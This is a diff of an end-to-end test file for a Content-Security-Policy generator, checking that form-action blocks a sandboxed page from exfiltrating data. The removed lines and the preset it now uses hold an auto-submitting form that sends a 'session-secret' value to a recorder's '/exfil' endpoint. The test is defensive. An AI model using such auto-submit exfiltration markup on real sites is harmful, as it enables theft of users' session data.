@@ -1,6 +1,7 @@
 import { test, expect } from '../../../test/e2e/fixture';
 import { useRecorder } from '../../../test/e2e/recorder';
 import { generateCSP } from '@src/lib/csp/csp-generator';
+import { fromPreset } from '../../../test/e2e/presets';
 
 /**
  * Research 12: directives dropped by the empty-array rule do not all fall back to default-src.
@@ -12,6 +13,7 @@ import { generateCSP } from '@src/lib/csp/csp-generator';
 // permitted form-action cannot be the positive control: a submission is a navigation, which the wrapper's
 // frame-src 'none' refuses anyway (S10). So the control submits the same form from a frame on the host page.
 const recorder = useRecorder();
+const preset = fromPreset('form-action-exfil');
 
 test('12.1 the default policy restricts base-uri and form-action, which have no fallback', () => {
     const policy = generateCSP({
@@ -31,15 +33,10 @@ test('12.1 the default policy restricts base-uri and form-action, which have no 
     expect(policy, 'form-action has no default-src fallback').toContain("form-action 'none'");
 });
 
-const formMarkup = (action: string) => `<form id="f" action="${action}" method="GET">
-      <input name="stolen" value="session-secret">
-    </form>
-    <script>document.getElementById('f').submit();</script>`;
-
 test('12.2 form-action: a GET form cannot exfiltrate to a non-allowlisted target', async ({ sandbox, page, browserName }) => {
-    // allow-forms is a sanctioned value in SAFE_CAPABILITIES
-    await sandbox.mount({ capabilities: ['allow-scripts', 'allow-forms'] });
-    await sandbox.load(`<html><head><title>t</title></head><body>${formMarkup(`${recorder.blocked}/exfil`)}</body></html>`);
+    // allow-forms (in the preset's rules) is a sanctioned value in SAFE_CAPABILITIES
+    await sandbox.mount(preset.rules);
+    await sandbox.load(preset.aimedAt(`${recorder.blocked}/exfil`));
 
     if (browserName === 'chromium') {
         // Measured 2026-10-13: in Chromium no report reaches the host. The guest document is replaced by the
@@ -57,6 +54,6 @@ test('12.2 positive control: the same form submitted from a frame on the host pa
         frame.setAttribute('sandbox', 'allow-scripts allow-forms');
         frame.srcdoc = markup;
         document.body.appendChild(frame);
-    }, formMarkup(`${recorder.blocked}/exfil`));
+    }, preset.aimedAt(`${recorder.blocked}/exfil`));
     await recorder.waitFor('blocked', '/exfil?stolen=session-secret');
 });
